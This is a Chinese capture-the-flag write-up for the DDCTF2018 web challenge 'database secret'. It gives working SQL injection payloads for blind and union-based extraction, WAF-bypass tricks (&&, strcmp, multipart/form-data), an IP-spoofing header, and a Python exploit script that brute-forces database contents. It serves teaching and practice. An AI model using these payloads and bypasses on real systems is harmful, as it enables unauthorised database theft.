@@ -1,0 +1,562 @@
+---
+title: DDCTF2018-数据库的秘密
+date: 2018-04-27 00:00:00
+categories:
+- CTF/Web
+tags: DDCTF XFF SQL注入 PyExecJS 原创绕where
+--- 
+
+## X-Forwarded-For绕过
+
+提示：非法链接，只允许来自 123.232.23.245 的访问。构造含有如下的请求头：
+
+`X-Forwarded-For: 123.232.23.245`
+
+在burp中发现的确可以有返回结果，但是也不能每次都用手去加请求头，尝试了很多种办法，最终找了两个浏览器的插件：添加请求头在浏览器里直接访问即可
+
+- ModHeader(chrome)
+- Modify Header Value(firefox)
+
+## 隐藏的注入点
+
+三个查询字段，四个输出字段，用burp拦截一个查询请求发现POST数据如下：
+
+```
+id=1&title=&date=&author=&button=search
+```
+
+在网页源码中发现author查询字段：
+
+```html
+<form id='queryForm' action="index.php" method="post">
+	<tr>
+	<td width="60">
+                 id: <input type="text" id="id" name="id" value="1" />
+	<td width="60">
+		 title: <input type="text" id="title" name="title" value="" />
+        </td>
+		<td width="60">
+		 date: <input type="text" id="date" name="date" value=""/>
+        </td>
+
+		<td width="40">
+		  <input type="hidden" id="author" name='author' value=''/>
+		  <input type="submit" name="button" id="button"  value="search" onclick="submitt()">
+		</td>
+	</tr>
+</form>
+```
+
+删掉hidden属性，测试author处存在注入点：`admin'#`查询成功
+
+
+## 测试过滤
+
+这里没有报错信息的回显，所以尝试联合查询与盲注
+
+- 尝试联合查询`admin' order by 5 #`测试为5个字段
+- 但继续`union select`被过滤
+
+这里发现，可以查询的所有字段都过了waf，所以没必要每次都先把author输入框显示再测试，直接在id框测试即可，测试拦截了如下：
+
+- `union select `
+- `and/or =/>/<`
+- `database(`
+- `load_file`
+- `/etc/passwd`
+- `into outfile`
+
+## 注入方式
+
+[SQL注入绕过技巧](https://www.cnblogs.com/Vinson404/p/7253255.html)
+
+联合查询过滤了union select，尝试一些大小写或者放进注释中的绕过均失败，所以认为这里只能采取盲注，尝试布尔盲注，一般payload如下：
+
+```sql
+admin' and ascii(substr((user()),1,1)) > 1 #
+```
+
+### 绕过and
+
+但是`and =`被过滤，尝试用`&&`代替`and`，`||`代替`or`
+
+```sql
+admin' && ascii(substr((user()),1,1)) > 1 #
+```
+
+### 绕过比较符号
+
+#### greates()
+
+```sql
+admin' and greatest(ascii(substr(user(),0,1)),64) like 64 #
+```
+
+#### strcmp()
+
+或者用strcmp绕过比较符号
+
+```sql
+admin' and strcmp(ascii(substr(user(),1,1)),1)#
+```
+
+比较两个字符串，如果这两个字符串相等返回0，如果第一个参数是根据当前的排序小于第二个参数顺序返回-1，否则返回1。
+
+```sql
+mysql> select strcmp(2,1),strcmp(2,2),strcmp(2,3);
++-------------+-------------+-------------+
+| strcmp(2,1) | strcmp(2,2) | strcmp(2,3) |
++-------------+-------------+-------------+
+|           1 |           0 |          -1 |
++-------------+-------------+-------------+
+```
+
+这里也许可以将数字当成字符串比较：
+
+- 第一个参数 > 第二个参数 返回 1
+- 第一个参数 = 第二个参数 返回 0 
+- 第一个参数 < 第二个参数 返回 -1
+
+但是也出现如下情况：
+
+```sql
+mysql> select strcmp(2,11);
++--------------+
+| strcmp(2,11) |
++--------------+
+|            1 |
++--------------+
+```
+
+这是由于他比较了第一个字符产生的，但实际我们在盲注中两个位置的循环是从33-127：
+
+- 在33-99的循环中，是完全符合的
+- 在100-127的循环中，也是完全符合
+
+会不会出现跨区间的判断呢？如下：
+
+```sql
+mysql> select strcmp(101,33),strcmp(33,101);
++----------------+----------------+
+| strcmp(101,33) | strcmp(33,101) |
++----------------+----------------+
+|             -1 |              1 |
++----------------+----------------+
+1 row in set (0.00 sec)
+```
+
+
+是有可能的:
+
+|第一个参数 | 循环结果|
+| - | - |
+|33| 0 -1|
+|(33,99)|1 0 -1 1|
+|99|1 0 1|
+|100|-1 0 -1|
+|(100,127)|-1 1 0 -1|
+|127|-1 1 0|
+
+
+但是其实无所谓，因为：
+
+```sql
+mysql> select (1 and 1),(1 and -1),(1 and 0);
++-----------+------------+-----------+
+| (1 and 1) | (1 and -1) | (1 and 0) |
++-----------+------------+-----------+
+|         1 |          1 |         0 |
++-----------+------------+-----------+
+```
+
+只有在0的时候才会返回为假，所以盲注可行，但这里要注意，strcmp可能不区分大小写
+
+```sql
+mysql> select strcmp('a','A');
++-----------------+
+| strcmp('a','A') |
++-----------------+
+|               0 |
++-----------------+
+```
+
+## 校验参数
+
+每次提交的URL中还有两个参数sig和time，其中time为时间戳，sig是根据输入参数生成的校验，这里与三种方式获得sig参数
+
+### 调试
+
+- 解码mian.js的内容eval改成alert运行即可，发现调用hex_math_enc函数
+- 断到math.js的hex_math_enc函数，看见参数: id=title=author=date=1time=1524823466adrefkfweodfsdpiru
+- math.js的开头说明：A JavaScript implementation of the Secure Hash Algorithm, SHA-1
+
+### ExecJs
+
+直接用python去调用js的函数
+
+### Selenuim
+
+直接模拟点击网页
+
+
+## 脚本(ExecJS)
+
+先把所有的js合成一个js文件，不要忘记主页的key
+
+web.js
+```javascript
+/*
+ * A JavaScript implementation of the Secure Hash Algorithm, SHA-1, as defined
+ * in FIPS PUB 180-1
+ * Version 2.1-BETA Copyright Paul Johnston 2000 - 2002.
+ * Other contributors: Greg Holt, Andrew Kepert, Ydnar, Lostinet
+ * Distributed under the BSD License
+ * See http://pajhome.org.uk/crypt/md5 for details.
+ */
+/*
+ * Configurable variables. You may need to tweak these to be compatible with
+ * the server-side, but the defaults work in most cases.
+ */
+var key="\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165";
+var hexcase = 0; /* hex output format. 0 - lowercase; 1 - uppercase     */
+var b64pad = ""; /* base-64 pad character. "=" for strict RFC compliance  */
+var chrsz = 8; /* bits per input character. 8 - ASCII; 16 - Unicode    */
+/*
+ * These are the functions you'll usually want to call
+ * They take string arguments and return either hex or base-64 encoded strings
+ */
+function hex_math_enc(s) {
+ return binb2hex(core_math_enc(str2binb(s), s.length * chrsz));
+}
+function b64_math_enc(s) {
+ return binb2b64(core_math_enc(str2binb(s), s.length * chrsz));
+}
+function str_math_enc(s) {
+ return binb2str(core_math_enc(str2binb(s), s.length * chrsz));
+}
+function hex_hmac_math_enc(key, data) {
+ return binb2hex(core_hmac_math_enc(key, data));
+}
+function b64_hmac_math_enc(key, data) {
+ return binb2b64(core_hmac_math_enc(key, data));
+}
+function str_hmac_math_enc(key, data) {
+ return binb2str(core_hmac_math_enc(key, data));
+}
+/*
+ * Perform a simple self-test to see if the VM is working
+ */
+function math_enc_vm_test() {
+ return hex_math_enc("abc") == "a9993e364706816aba3e25717850c26c9cd0d89d";
+}
+/*
+ * Calculate the SHA-1 of an array of big-endian words, and a bit length
+ */
+function core_math_enc(x, len) {
+ /* append padding */
+ x[len >> 5] |= 0x80 << (24 - len % 32);
+ x[((len + 64 >> 9) << 4) + 15] = len;
+ var w = Array(80);
+ var a = 1732584193;
+ var b = -271733879;
+ var c = -1732584194;
+ var d = 271733878;
+ var e = -1009589776;
+ for (var i = 0; i < x.length; i += 16) {
+  var olda = a;
+  var oldb = b;
+  var oldc = c;
+  var oldd = d;
+  var olde = e;
+  for (var j = 0; j < 80; j++) {
+   if (j < 16) w[j] = x[i + j];
+   else w[j] = rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);
+   var t = safe_add(safe_add(rol(a, 5), math_enc_ft(j, b, c, d)), safe_add(safe_add(e, w[j]), math_enc_kt(j)));
+   e = d;
+   d = c;
+   c = rol(b, 30);
+   b = a;
+   a = t;
+  }
+  a = safe_add(a, olda);
+  b = safe_add(b, oldb);
+  c = safe_add(c, oldc);
+  d = safe_add(d, oldd);
+  e = safe_add(e, olde);
+ }
+ return Array(a, b, c, d, e);
+}
+/*
+ * Perform the appropriate triplet combination function for the current
+ * iteration
+ */
+function math_enc_ft(t, b, c, d) {
+ if (t < 20) return (b & c) | ((~b) & d);
+ if (t < 40) return b ^ c ^ d;
+ if (t < 60) return (b & c) | (b & d) | (c & d);
+ return b ^ c ^ d;
+}
+/*
+ * Determine the appropriate additive constant for the current iteration
+ */
+function math_enc_kt(t) {
+ return (t < 20) ? 1518500249 : (t < 40) ? 1859775393 : (t < 60) ? -1894007588 : -899497514;
+}
+/*
+ * Calculate the HMAC-SHA1 of a key and some data
+ */
+function core_hmac_math_enc(key, data) {
+ var bkey = str2binb(key);
+ if (bkey.length > 16) bkey = core_math_enc(bkey, key.length * chrsz);
+ var ipad = Array(16),
+  opad = Array(16);
+ for (var i = 0; i < 16; i++) {
+  ipad[i] = bkey[i] ^ 0x36363636;
+  opad[i] = bkey[i] ^ 0x5C5C5C5C;
+ }
+ var hash = core_math_enc(ipad.concat(str2binb(data)), 512 + data.length * chrsz);
+ return core_math_enc(opad.concat(hash), 512 + 160);
+}
+/*
+ * Add integers, wrapping at 2^32. This uses 16-bit operations internally
+ * to work around bugs in some JS interpreters.
+ */
+function safe_add(x, y) {
+ var lsw = (x & 0xFFFF) + (y & 0xFFFF);
+ var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
+ return (msw << 16) | (lsw & 0xFFFF);
+}
+/*
+ * Bitwise rotate a 32-bit number to the left.
+ */
+function rol(num, cnt) {
+ return (num << cnt) | (num >>> (32 - cnt));
+}
+/*
+ * Convert an 8-bit or 16-bit string to an array of big-endian words
+ * In 8-bit function, characters >255 have their hi-byte silently ignored.
+ */
+function str2binb(str) {
+ var bin = Array();
+ var mask = (1 << chrsz) - 1;
+ for (var i = 0; i < str.length * chrsz; i += chrsz)
+ bin[i >> 5] |= (str.charCodeAt(i / chrsz) & mask) << (24 - i % 32);
+ return bin;
+}
+/*
+ * Convert an array of big-endian words to a string
+ */
+function binb2str(bin) {
+ var str = "";
+ var mask = (1 << chrsz) - 1;
+ for (var i = 0; i < bin.length * 32; i += chrsz)
+ str += String.fromCharCode((bin[i >> 5] >>> (24 - i % 32)) & mask);
+ return str;
+}
+/*
+ * Convert an array of big-endian words to a hex string.
+ */
+function binb2hex(binarray) {
+ var hex_tab = hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
+ var str = "";
+ for (var i = 0; i < binarray.length * 4; i++) {
+  str += hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8 + 4)) & 0xF) + hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8)) & 0xF);
+ }
+ return str;
+}
+/*
+ * Convert an array of big-endian words to a base-64 string
+ */
+function binb2b64(binarray) {
+ var tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+ var str = "";
+ for (var i = 0; i < binarray.length * 4; i += 3) {
+  var triplet = (((binarray[i >> 2] >> 8 * (3 - i % 4)) & 0xFF) << 16) | (((binarray[i + 1 >> 2] >> 8 * (3 - (i + 1) % 4)) & 0xFF) << 8) | ((binarray[i + 2 >> 2] >> 8 * (3 - (i + 2) % 4)) & 0xFF);
+  for (var j = 0; j < 4; j++) {
+   if (i * 8 + j * 6 > binarray.length * 32) str += b64pad;
+   else str += tab.charAt((triplet >> 6 * (3 - j)) & 0x3F);
+  }
+ }
+ return str;
+}
+
+
+
+
+function signGenerate(obj, key) {
+	var str0 = '';
+	for (i in obj) {
+		if (i != 'sign') {
+			str1 = '';
+			str1 = i + '=' + obj[i];
+			str0 += str1
+		}
+	}
+	return hex_math_enc(str0 + key)
+};
+var obj = {
+	id: '',
+	title: '',
+	author: '',
+	date: '',
+	time: parseInt(new Date().getTime() / 1000)
+};
+
+function submitt(id,title,author,date) {
+	obj['id'] = id;
+	obj['title'] = title;
+	obj['author'] = author;
+	obj['date'] = date;
+	var sign = signGenerate(obj, key);
+	//document.getElementById('queryForm').action = "index.php?sig=" + sign + "&time=" + obj.time;
+	//document.getElementById('queryForm').submit()
+	return "index.php?sig=" + sign + "&time=" + obj.time;
+}
+```
+
+
+exp.py
+```python
+
+import requests
+import execjs 
+import time
+
+def get_js():  
+     
+    f = open("web.js",'r')  
+    line = f.readline()  
+    htmlstr = ''  
+    while line:  
+        htmlstr = htmlstr + line  
+        line = f.readline()  
+    return htmlstr  
+def get_nonce(id,title,author,date):
+    jsstr = get_js()  
+    ctx = execjs.compile(jsstr)  
+    return (ctx.call("submitt",id,title,author,date))
+
+flag=""
+old_url="http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/"
+
+for i in range(1,400):
+    for j in range(33,127):
+        #payload = "admin' and strcmp(ascii(substr(user(),%s,1)),%s) #" %(i,j)
+        #payload = "admin' and strcmp(ascii(substr((select group_concat(schema_name) from information_schema.schemata),%s,1)),%s) #" %(i,j)
+        #payload = "admin' && strcmp(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ddctf'),%s,1)),%s) #" %(i,j)
+        #payload = "admin' && strcmp(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctf_key5'),%s,1)),%s) #" %(i,j)
+        #payload = "admin' and strcmp(ascii(substr((select secvalue from ctf_key5),%s,1)),%s) #" %(i,j)
+        #payload = "admin' and strcmp(ascii(substr((select * from ctf_key5),%s,1)),%s) #" %(i,j)
+        url = old_url+get_nonce('','',payload,'')
+        
+        data ={
+            "id": "",
+            "title": "",
+            "author":payload,
+            "date":""
+        }
+        headers = {'X-Forwarded-For': '123.232.23.245'}
+
+        r = requests.post(url=url,headers=headers,data=data)
+
+        #print r.content
+        if "admin" not in r.content:
+            flag += chr(j)
+            print flag
+            break
+```
+
+## 突发奇想
+
+我在做这道题的时候没有用&&代替and导致我产生了如下幻觉：
+
+
+爆数据库名，没问题:
+
+```
+payload = "admin' and strcmp(ascii(substr((select group_concat(schema_name) from information_schema.schemata),%s,1)),%s) #" %(i,j)
+```
+
+
+爆数据库名，死活就是不行（其实因为这里有and 和 = ）
+
+```
+payload = "admin' and strcmp(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ddctf'),%s,1)),%s) #" %(i,j)
+```
+
+### 绕过where
+
+我以为是过滤了where，如果用如下语句，不用where字句，他会把我的所有表项打出来
+
+```
+select group_concat(table_name) from information_schema.tables;
+```
+
+这道题只有俩数据库，information_schema的表项是固定的（和版本有关），所以我先看一下information_schema表项占了多少个字符，在本地用尝试：
+
+```
+mysql> select @@version;
++-----------+
+| @@version |
++-----------+
+| 5.1.73    |
++-----------+
+
+mysql> select group_concat(table_name) from information_schema.tables where table_schema='information_schema';
+
+CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS 
+
+```
+
+- mysql 5.1.73共376个字符
+
+```
+mysql> select @@version;
++-----------+
+| @@version |
++-----------+
+| 5.7.21    |
++-----------+
+
+
+CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_LOCKS,INNODB_TRX,INNODB_SYS_DATAFILES,INNODB_FT_CONFIG,INNODB_SYS_VIRTUAL,INNODB_CMP,INNODB_FT_BEING_DELETED,INNODB_CMP_RESET,INNODB_CMP_PER_INDEX,INNODB_CMPMEM_RESET,INNODB_FT_DELETED,INNODB_BUFFER_PAGE_LRU,INNODB_LOCK_WAITS,INNODB_TEMP_TABLE_INFO,INNODB_SYS_INDEXES,INNODB_SYS_TABLES,INNODB_SYS_FIELDS,INNODB_CMP_PER_INDEX_RESET,INNODB_BUFFER_PAGE,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_INDEX_TABLE,INNODB_FT_INDEX_CACHE,INNODB_SYS_TABLESPACES,INNODB_METRICS,INNODB_SYS_FOREIGN_COLS,INNODB_CMPMEM,INNODB_BUFFER_POOL_STATS,INNODB_SYS_COLUMNS,INNODB_SYS_FOREIGN,INNODB_SYS_TABLESTATS
+```
+
+- mysql 5.7.21 共1004个字符
+
+#### 爆表名
+
+所有直接尝试第一层循环也就是substr()函数的第二个参数从377开始递增，同样可以得到表名ctf_key5，大概如下：
+
+```python
+for i in range(377,400):
+    for j in range(33,127):
+    	payload = "admin' && strcmp(ascii(substr((select group_concat(table_name) from information_schema.tables),%s,1)),%s) #" %(i,j)
+```
+
+#### 爆字段名
+
+字段名过多这里没有采用上一种方式，尝试使用`*`代替字段名（仅在只有一个字段，一行数据时可用），直接获取flag
+
+```
+payload = "admin' and strcmp(ascii(substr((select * from ctf_key5),%s,1)),%s) #" %(i,j)
+```
+
+## waf失效
+
+参考：[2018 DDCTF Web 部分writeup](https://delcoding.github.io/2018/04/ddctf-writeup2/)
+
+使用enctype="multipart/form-data"方式提交表单防火墙不拦截，更改表单直接联合查询：
+
+```html
+<form id='queryForm' action="index.php" method="post" enctype="multipart/form-data">
+```
+
+```sql
+admin' union select 1,2,3,group_concat(schema_name),5 from information_schema.schemata #
+admin' union select 1,2,3,group_concat(table_name),5 from information_schema.schemata #
+admin' union select 1,2,3,group_concat(column_name),5 from information_schema.schemata #
+admin' union select 1,2,3,secvalue,5 from ctf_key5 #
+```
+
+
